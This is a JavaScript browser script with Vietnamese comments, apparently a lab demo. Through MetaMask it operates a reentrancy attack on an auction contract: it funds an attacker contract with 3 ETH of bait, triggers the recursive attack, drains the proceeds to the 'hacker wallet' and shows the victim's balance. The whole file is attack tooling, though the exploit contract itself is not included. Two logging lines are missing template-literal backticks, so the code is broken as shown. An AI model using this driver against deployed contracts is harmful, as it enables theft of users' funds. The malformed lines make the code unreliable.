let provider, signer, signerAddress;

// ABI (Giao diện để JS hiểu Contract có hàm gì)
let auctionABI = [
    "function getBalance() public view returns (uint)"
];
let attackABI = [
    "function setupAttack() public payable", // Hàm nạp tiền mồi
    "function attack() public",              // Hàm kích hoạt đệ quy
    "function drainFunds() public"           // Hàm rút tiền về ví hacker
];

let auctionContract, attackContract;
const statusEl = document.getElementById("status");

// Hàm hiển thị thông báo
function log(message) {
    console.log(message);
    statusEl.innerText = message;
}

// 1. Kết nối MetaMask
document.getElementById("connectButton").onclick = async () => {
    if (!window.ethereum) {
        log("Lỗi: Vui lòng cài đặt MetaMask!");
        return;
    }
    try {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        // Yêu cầu quyền truy cập ví
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        signerAddress = await signer.getAddress();
        log("Đã kết nối ví: " + signerAddress);
    } catch (err) {
        log("Lỗi kết nối: " + err.message);
    }
};

// Hàm tiện ích: Khởi tạo contract từ địa chỉ nhập vào
function setupContracts() {
    const auctionAddr = document.getElementById("auctionAddr").value.trim();
    const attackAddr = document.getElementById("attackAddr").value.trim();

    if (!auctionAddr || !attackAddr) {
        log("Vui lòng nhập đầy đủ địa chỉ contract!");
        return false;
    }
    if (!signer) {
        log("Vui lòng kết nối ví trước!");
        return false;
    }

    // Kết nối contract với signer (để có thể gửi giao dịch)
    auctionContract = new ethers.Contract(auctionAddr, auctionABI, signer);
    attackContract = new ethers.Contract(attackAddr, attackABI, signer);
    return true;
}

// 2. Nạp tiền mồi (Setup)
document.getElementById("setupAttackButton").onclick = async () => {
    if (!setupContracts()) return;
    log("Đang gửi 3 ETH 'mồi' vào contract Hacker...");
    
    try {
        // Gọi hàm setupAttack và gửi kèm 3 ETH
        const tx = await attackContract.setupAttack({ 
            value: ethers.utils.parseEther("3.0") 
        });
        await tx.wait(); // Chờ giao dịch được xác nhận
        log("Đã nạp 3 ETH thành công. Sẵn sàng tấn công!");
    } catch (err) {
        log("Lỗi setup: " + (err.reason || err.message));
    }
};

// 3. TẤN CÔNG (Attack)
document.getElementById("runAttack").onclick = async () => {
    if (!setupContracts()) return;
    log("!!! ĐANG TẤN CÔNG (gọi hàm attack)... !!!");
    
    try {
        // Gọi hàm attack() để kích hoạt Reentrancy
        const tx = await attackContract.attack();
        await tx.wait();
        log("TẤN CÔNG HOÀN TẤT! Hãy kiểm tra số dư của Nạn nhân.");
    } catch (err) {
        log("Lỗi tấn công: " + (err.reason || err.message));
    }
};

// 4. Rút tiền về ví (Drain)
document.getElementById("drainFunds").onclick = async () => {
    if (!setupContracts()) return;
    log("Đang rút tiền về ví cá nhân...");
    
    try {
        const tx = await attackContract.drainFunds();
        await tx.wait();
        log("Đã rút hết tiền về ví Hacker thành công!");
    } catch (err) {
        log("Lỗi rút tiền: " + (err.reason || err.message));
    }
};

// --- Các nút kiểm tra số dư ---

document.getElementById("getAuctionBalance").onclick = async () => {
    if (!setupContracts()) return;
    try {
        // Lấy số dư trực tiếp từ Blockchain (chính xác hơn)
        const balance = await provider.getBalance(auctionContract.address);
        log(Số dư Nạn nhân (Auction): ${ethers.utils.formatEther(balance)} ETH);
    } catch (err) {
        log("Lỗi: " + err.message);
    }
};

document.getElementById("getAttackBalance").onclick = async () => {
    if (!setupContracts()) return;
    try {
        const balance = await provider.getBalance(attackContract.address);
        log(Số dư Hacker Contract: ${ethers.utils.formatEther(balance)} ETH);
    } catch (err) {
        log("Lỗi: " + err.message);
    }
};